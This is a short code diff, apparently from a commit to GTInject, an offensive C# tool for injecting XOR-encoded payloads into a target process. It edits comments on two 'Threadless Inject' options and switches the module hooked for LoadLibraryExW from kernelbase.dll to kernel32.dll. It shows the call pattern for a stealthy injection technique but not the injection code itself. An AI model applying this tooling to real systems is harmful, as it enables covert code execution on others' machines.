@@ -66,7 +66,7 @@ namespace GTInject.Novel
         {
             // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
             /////////////////////////////////////
-            // OPTION 400 == Threadless Inject - Indirect Syscalls - CreateEventW
+            // OPTION 400 == Threadless Inject - CreateEventW
             /////////////////////////////////////
             ///
             ThreadlessInject.Inject(ProcID, "kernelbase.dll", "CreateEventW", binLocation, bytePath, xorkey);
@@ -77,9 +77,9 @@ namespace GTInject.Novel
         {
             // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
             /////////////////////////////////////
-            // OPTION 400 == Threadless Inject - Indirect Syscalls - LoadLibraryExW
+            // OPTION 400 == Threadless Inject - LoadLibraryExW
             /////////////////////////////////////
-            ThreadlessInject.Inject(ProcID, "kernelbase.dll", "LoadLibraryExW", binLocation, bytePath, xorkey);
+            ThreadlessInject.Inject(ProcID, "kernel32.dll", "LoadLibraryExW", binLocation, bytePath, xorkey);
             return (IntPtr.Zero);
 
         }
